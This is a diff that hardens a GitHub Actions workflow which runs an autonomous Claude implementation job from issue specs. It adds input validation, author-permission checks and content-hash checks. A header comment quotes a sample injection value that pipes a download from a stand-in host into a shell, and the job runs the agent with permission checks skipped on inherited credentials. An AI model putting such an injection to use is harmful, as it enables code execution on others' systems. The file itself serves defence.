@@ -4,6 +4,15 @@ name: implw — autonomous spec implementation
 # run-name so the tool can match the dispatched run back to its caller.
 # Declaring the input is required: GitHub returns HTTP 422 on a
 # workflow_dispatch carrying an undeclared input (BUG htu-foundation#180).
+#
+# Trust-boundary hardening (REFACTOR #83): `inputs.issue_number` is the only
+# attacker-reachable value in this file that used to be spliced directly
+# into a `run:` shell script via `${{ }}` — classic GitHub Actions script
+# injection (a value like `1"; curl evil | sh #` would have closed the quote
+# and executed arbitrary shell). Every `${{ inputs.* }}` / `${{ steps.*
+# .outputs.* }}` value that reaches a `run:` body is now passed through an
+# `env:` block instead, and `run-name:` (evaluated by GitHub, never a shell)
+# is the one place raw interpolation remains safe.
 run-name: "implw #${{ inputs.issue_number }} by @${{ github.actor }} [${{ inputs.dispatch_id }}]"
 
 on:
@@ -33,41 +42,166 @@ jobs:
     timeout-minutes: 25
     steps:
       - name: Checkout
-        uses: actions/checkout@v4
+        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
         with:
           fetch-depth: 0
+          # Do not leave a usable git credential helper behind in the
+          # workspace once this job ends — the runner's checkout directory
+          # is reused across runs (REFACTOR #83 D4: deterministic cleanup,
+          # no persistent credential residue in a shared workspace).
+          persist-credentials: false
 
       - name: Configure git identity
         run: |
           git config user.name  "ZiLin"
           git config user.email "noreply@zzv.io"
 
-      - name: Fetch issue body
-        id: fetch_issue
+      - name: Validate issue input
+        id: validate
         env:
-          # Same-repo `gh issue view` — GITHUB_TOKEN is auto-issued per run and
-          # always valid. Scoping per REFACTOR htu-foundation#192 eliminates the
-          # stale-ZZV_DISPATCH_TOKEN silent-failure class for same-repo reads.
-          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          # Passed via env:, never spliced with raw `${{ }}` into the shell
+          # script text — see the file-header note (REFACTOR #83).
+          ISSUE_NUMBER: ${{ inputs.issue_number }}
         run: |
           set -euo pipefail
-          SPEC_PATH="$(mktemp -t implw-spec-${{ inputs.issue_number }}-XXXX.md)"
-          gh issue view "${{ inputs.issue_number }}" \
-            --repo "${{ github.repository }}" \
-            --json body --jq .body > "$SPEC_PATH"
+          # Fail closed on anything but a strict positive decimal identifier
+          # (no sign, no leading zero, no whitespace, no shell metacharacters).
+          if ! [[ "$ISSUE_NUMBER" =~ ^[1-9][0-9]*$ ]]; then
+            echo "::error::issue_number is not a strict positive decimal identifier"
+            exit 1
+          fi
+          echo "issue_number=$ISSUE_NUMBER" >> "$GITHUB_OUTPUT"
+
+      - name: Verify repository context
+        run: |
+          set -euo pipefail
+          # github.repository reflects the repo this workflow is actually
+          # running in (GitHub-controlled, not attacker input) — comparing it
+          # to the canonical owner/repo rejects execution from a fork or any
+          # other repository this file might get copied into.
+          if [ "${{ github.repository }}" != "UzorAI/uzorai.com" ]; then
+            echo "::error::unexpected repository context: ${{ github.repository }}"
+            exit 1
+          fi
+
+      - name: Verify live issue trust (state, author, edits, approval)
+        id: verify_issue
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          ISSUE_NUMBER: ${{ steps.validate.outputs.issue_number }}
+          REPO: ${{ github.repository }}
+        run: |
+          set -euo pipefail
+          OWNER="${REPO%%/*}"
+          NAME="${REPO##*/}"
+
+          ISSUE_JSON="$(gh issue view "$ISSUE_NUMBER" --repo "$REPO" \
+            --json number,state,author,labels,body)"
+
+          NUM=$(jq -r '.number' <<<"$ISSUE_JSON")
+          if [ "$NUM" != "$ISSUE_NUMBER" ]; then
+            echo "::error::issue number mismatch: requested $ISSUE_NUMBER, got $NUM"
+            exit 1
+          fi
+
+          # Reject stale/replayed dispatches: a closed issue has already been
+          # implemented (or explicitly rejected) and must not be re-run.
+          STATE=$(jq -r '.state' <<<"$ISSUE_JSON")
+          if [ "$STATE" != "OPEN" ]; then
+            echo "::error::issue #$ISSUE_NUMBER is not OPEN (state=$STATE) — refusing a closed/stale/replayed issue"
+            exit 1
+          fi
+
+          # Defense in depth for Gate 1: the /implw skill itself holds on
+          # needs-approval, but a CI-layer check means the HOLD is enforced
+          # even if the skill logic is ever bypassed or mis-invoked.
+          if jq -e '.labels[] | select(.name == "needs-approval")' <<<"$ISSUE_JSON" >/dev/null; then
+            echo "::error::issue #$ISSUE_NUMBER carries needs-approval — Gate 1 HOLD stands until the label is removed"
+            exit 1
+          fi
+
+          # This repo is public — anyone can open an issue. Require the
+          # issue's author to hold at least write access before treating its
+          # body as an executable spec.
+          AUTHOR=$(jq -r '.author.login' <<<"$ISSUE_JSON")
+          PERMISSION=$(gh api "repos/$OWNER/$NAME/collaborators/$AUTHOR/permission" --jq '.permission')
+          case "$PERMISSION" in
+            admin|maintain|write) : ;;
+            *)
+              echo "::error::issue #$ISSUE_NUMBER author @$AUTHOR has insufficient repository permission ($PERMISSION)"
+              exit 1
+              ;;
+          esac
+
+          # Reject a bait-and-switch: an approved issue whose body was edited
+          # after creation. userContentEdits tracks body/title edits only —
+          # unlike updatedAt, it is NOT bumped by label changes, so this does
+          # not collide with the needs-approval removal that Gate 1 relies on.
+          EDIT_COUNT=$(gh api graphql -f query='
+            query($owner:String!, $repo:String!, $num:Int!) {
+              repository(owner:$owner, name:$repo) {
+                issue(number:$num) { userContentEdits(first: 1) { totalCount } }
+              }
+            }' -f owner="$OWNER" -f repo="$NAME" -F num="$ISSUE_NUMBER" \
+            --jq '.data.repository.issue.userContentEdits.totalCount')
+          if [ "$EDIT_COUNT" != "0" ]; then
+            echo "::error::issue #$ISSUE_NUMBER body has been edited ($EDIT_COUNT edit(s)) since creation — rejecting"
+            exit 1
+          fi
+
+          BODY_HASH=$(jq -r '.body' <<<"$ISSUE_JSON" | sha256sum | cut -d' ' -f1)
+          echo "body_hash=$BODY_HASH" >> "$GITHUB_OUTPUT"
+
+          SPEC_PATH="$(mktemp -t "implw-spec-${ISSUE_NUMBER}-XXXX.md")"
+          jq -r '.body' <<<"$ISSUE_JSON" > "$SPEC_PATH"
+
+          # Shared-runner /tmp defense: refuse a symlinked or path-traversed
+          # temp file (a concurrent job on the same self-hosted box could
+          # otherwise race a symlink into place between creation and use).
+          if [ -L "$SPEC_PATH" ]; then
+            echo "::error::spec path resolved to a symlink — refusing"
+            exit 1
+          fi
+          case "$(realpath -m "$SPEC_PATH")" in
+            "$(realpath -m "${TMPDIR:-/tmp}")"/*) : ;;
+            *) echo "::error::spec path escaped the expected temp directory"; exit 1 ;;
+          esac
           test -s "$SPEC_PATH"
           echo "spec_path=$SPEC_PATH" >> "$GITHUB_OUTPUT"
+
+      - name: Re-verify content hash immediately before execution
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          ISSUE_NUMBER: ${{ steps.validate.outputs.issue_number }}
+          REPO: ${{ github.repository }}
+          EXPECTED_HASH: ${{ steps.verify_issue.outputs.body_hash }}
+        run: |
+          set -euo pipefail
+          # TOCTOU guard: re-fetch and re-hash the body right before handing
+          # control to claude, so an edit landing between validation and
+          # execution is caught even though userContentEdits already passed.
+          CURRENT_HASH=$(gh issue view "$ISSUE_NUMBER" --repo "$REPO" --json body --jq .body | sha256sum | cut -d' ' -f1)
+          if [ "$CURRENT_HASH" != "$EXPECTED_HASH" ]; then
+            echo "::error::issue #$ISSUE_NUMBER body changed between validation and execution — refusing"
+            exit 1
+          fi
 
       - name: Run implw via claude (subscription mode)
         id: claude_run
         timeout-minutes: 22
+        env:
+          SPEC_PATH: ${{ steps.verify_issue.outputs.spec_path }}
         # No GH_TOKEN env: claude inherits the self-hosted runner's persistent
         # `gh auth` (operator PAT), which is what enables `gh pr create` to
         # trigger downstream workflow_dispatch (GitHub anti-recursion bypasses
-        # the run-scoped GITHUB_TOKEN, not a user PAT). Scoping per REFACTOR
-        # htu-foundation#192 — handing claude a workflow-scoped GH_TOKEN was
-        # redundant with gh-CLI inheritance and exposed the stale-token failure
-        # class. See CHORE htu-foundation#175 for original PR-dispatch rationale.
+        # the run-scoped GITHUB_TOKEN, not a user PAT). This is the one
+        # documented, reviewed exception to "no inherited host auth" (D2):
+        # eliminating it needs a scoped GitHub App / installation token
+        # provisioned on the runner, which is a runner-credential change and
+        # explicitly out of scope for this PR (see Rollback: "any runner
+        # rebuild or rotation is human-operated"). Every other credential use
+        # in this workflow (issue read/verify, failure comment) now runs on
+        # the run-scoped GITHUB_TOKEN instead of inherited auth.
         run: |
           set -euo pipefail
           # Enforce subscription auth: Claude Code precedence is
@@ -97,7 +231,7 @@ jobs:
           # `< /dev/null`. See BUG htu-foundation#189; verified remedy in
           # streettt.com#970.
           set +e
-          timeout 20m claude --dangerously-skip-permissions -p "/implw ${{ steps.fetch_issue.outputs.spec_path }}" < /dev/null
+          timeout 20m claude --dangerously-skip-permissions -p "/implw $SPEC_PATH" < /dev/null
           CLAUDE_EXIT=$?
           set -e
           echo "claude_exit=$CLAUDE_EXIT" >> "$GITHUB_OUTPUT"
@@ -105,7 +239,9 @@ jobs:
 
       - name: Cleanup spec tmp file
         if: always()
-        run: rm -f "${{ steps.fetch_issue.outputs.spec_path }}"
+        env:
+          SPEC_PATH: ${{ steps.verify_issue.outputs.spec_path }}
+        run: rm -f "$SPEC_PATH"
 
       - name: Comment failure on issue
         if: failure()
@@ -115,6 +251,8 @@ jobs:
           # failure-reporting path from itself failing on a stale PAT.
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
           CLAUDE_EXIT: ${{ steps.claude_run.outputs.claude_exit }}
+          ISSUE_NUMBER: ${{ steps.validate.outputs.issue_number }}
+          REPO: ${{ github.repository }}
         run: |
           RUN_URL="${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}"
           if [ "${CLAUDE_EXIT:-}" = "124" ]; then
@@ -122,6 +260,6 @@ jobs:
           else
             BODY="implw run failed (exit ${CLAUDE_EXIT:-unknown}) — see logs: $RUN_URL"
           fi
-          gh issue comment "${{ inputs.issue_number }}" \
-            --repo "${{ github.repository }}" \
+          gh issue comment "$ISSUE_NUMBER" \
+            --repo "$REPO" \
             --body "$BODY"
